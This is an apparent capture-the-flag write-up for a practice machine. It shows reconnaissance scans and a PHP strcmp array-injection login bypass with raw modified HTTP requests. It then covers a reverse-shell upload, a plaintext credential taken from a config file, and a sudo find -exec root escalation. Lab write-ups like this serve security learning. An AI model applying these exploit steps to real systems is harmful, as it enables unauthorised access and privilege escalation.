![[Pasted image 20210427100003.png]]

Starting with a basic nmap scan 

`nmap -sC -sV 10.10.10.48`

![[Pasted image 20210427100403.png]]

We have port 22 and port 80 open 

![[Pasted image 20210427100443.png]]

We have a login.php page 

![[Pasted image 20210427100629.png]]

We can see that after running dirbuster scan we see that we have /login directory 

![[Pasted image 20210427100901.png]]

![[Pasted image 20210427100931.png]]

The config.php is an empty file 

In the login.php.swp file we fin that there is a string compare function in php that is running in the baskground (strcmp)

The way to bypass it is ,
It expects the user to give a string and if the user instead gives an array the output is zero 

![[Pasted image 20210427102204.png]]

Here if the username and password gives back zero in the output we get a login successful message 

So what we do is intercept the login request in burp 

When the application expects the staring value for the variables 'username' and 'password' 

![[Pasted image 20210427102527.png]] - Original Request

```
POST /login/login.php HTTP/1.1
Host: 10.10.10.48
Content-Length: 27
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.10.48
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.10.48/login/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=j0rp456vmh0d6ieo427grq8bsr
Connection: close

username=user&password=pass
```

![[Pasted image 20210427102639.png]] - Modified Request 

```
POST /login/login.php HTTP/1.1
Host: 10.10.10.48
Content-Length: 27
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.10.48
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.10.48/login/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=j0rp456vmh0d6ieo427grq8bsr
Connection: close

username[]=user&password[]=pass
```

Which gives us the upload.php page where we can upload the files

![[Pasted image 20210427102740.png]]

![[Pasted image 20210427103024.png]]

![[Pasted image 20210427103046.png]]

We know that the files are being uploaded to a directory named  _uploaded

`http://10.10.10.48/_uplpaded/reverse-1.php`

Going to the above url we can execute the php file and get a reverse shell

![[Pasted image 20210427103405.png]]

![[Pasted image 20210427103420.png]]

We get a shell as the www-data

There was a config.php file which was not visible on the frontend , we can access it through the user www-data

![[Pasted image 20210427103853.png]]

We get the admin username and password 
But the password is of the user john 

username : `john`

password : `thisisagoodpassword`

![[Pasted image 20210427104119.png]]

We get the user.txt file 

It turns out that we can run find command as the root user 
So we can run the command and break out of the shell

`sudo find user.txt -exec "whoami" \;`

![[Pasted image 20210427104609.png]]

by running the command 

`sudo find user.txt -exec "/bin/bash" \;`

![[Pasted image 20210427105509.png]]

We get the root flag

